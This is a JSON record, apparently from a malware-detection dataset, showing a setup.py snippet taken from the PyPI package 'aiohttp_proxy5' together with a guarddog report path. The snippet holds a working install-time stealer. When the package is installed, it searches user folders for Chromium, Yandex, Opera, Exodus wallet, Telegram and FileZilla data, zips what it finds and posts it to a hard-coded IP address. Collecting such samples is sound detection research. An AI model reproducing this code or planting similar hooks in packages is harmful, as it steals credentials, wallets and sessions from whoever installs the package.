[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport sys\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    os.system('pip install aiofiles')\n    os.system('pip install aiohttp')\n    os.system('pip install cryptography')\n    os.system('pip install aiosqlite')\n    import contextlib as __stickytape_contextlib\n\n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n\n            make_package(os.path.dirname(path))\n\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n\n        __stickytape_write_module('path_search.py', b\"import asyncio\\r\\nimport os\\r\\nfrom os.path import join, isdir\\r\\nfrom typing import Dict, Iterable, List\\r\\n\\r\\n\\r\\nLOCAL = os.environ['USERPROFILE']\\r\\n\\r\\nroot_paths = {\\r\\n    join(LOCAL, 'appdata'),\\r\\n    join(LOCAL, 'appdata', 'local'),\\r\\n    join(LOCAL, 'appdata', 'roaming'),\\r\\n    join(LOCAL, 'documents'),\\r\\n    join(LOCAL, 'downloads'),\\r\\n    join(LOCAL, 'desktop'),\\r\\n    'C:\\\\',\\r\\n    'D:\\\\',\\r\\n    'E:\\\\',\\r\\n    'C:\\\\Program Files',\\r\\n    'C:\\\\Program Files (x86)',\\r\\n    'C:\\\\\\\\ProgramData'\\r\\n\\r\\n}\\r\\n\\r\\n\\r\\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\\r\\n    tasks: List[asyncio.Task] = []\\r\\n\\r\\n    queries = {k.lower(): v for k,v in queries.items()}\\r\\n    target_folder_names = set(queries.keys())\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if queries[fname] is not None:\\r\\n                    curr_path = join(p, fname)\\r\\n                    loop = asyncio.get_event_loop()\\r\\n                    task = loop.create_task(queries[fname].callback(curr_path))\\r\\n                    tasks.append(task)\\r\\n\\r\\n    for task in tasks:\\r\\n        await task\\r\\n\\r\\n\\r\\nasync def search_paths(paths: Iterable[str], queries: Iterable):\\r\\n    target_folder_names = {i.lower() for i in queries}\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if fname in target_folder_names:\\r\\n                    yield join(p, fname)\\r\\n\")\n        # ... (many __stickytape_write_module calls omitted for brevity)\n        import asyncio\n        from asyncio import create_task\n        from weakref import proxy\n        from path_search import search_plugin_paths, root_paths\n        from config import Config\n        from aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData\n        import secrets\n        import timeit\n        from paths import TEMP\n        from os import mkdir\n        from os.path import join\n        from zipfile import ZipFile, ZIP_DEFLATED\n        from base64 import b64encode\n        from tools import zipdir\n        \n        from plugins import Chromium, Details, Exodus, Filezilla, Telegram\n        \n        \n        \n        HOST = 'http://144.24.115.170'\n        \n        \n        async def main() -> None:\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n        \n            print(log_path)\n            mkdir(log_path)\n        \n            tasks = []\n        \n            conf = Config(client_id=client_id, host=HOST, log_path=log_path)\n            \n            chromium = Chromium(conf)\n        \n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'yandex': chromium,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            \n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n        \n            other_plugins = [Details(conf)]\n        \n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n        \n            for task in tasks:\n                await task\n            \n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n        \n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            \n                async with Session() as s:\n                    await s.post(f'{HOST}/receive_log', data=writer, params={'client_id': client_id})\n        \n        asyncio.run(main())"
  },
  {
    "metadata": {
      "package_name": "aiohttp_proxy5-0.1.14",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/aiohttp_proxy5-0.1.14.txt"
    }
  }
]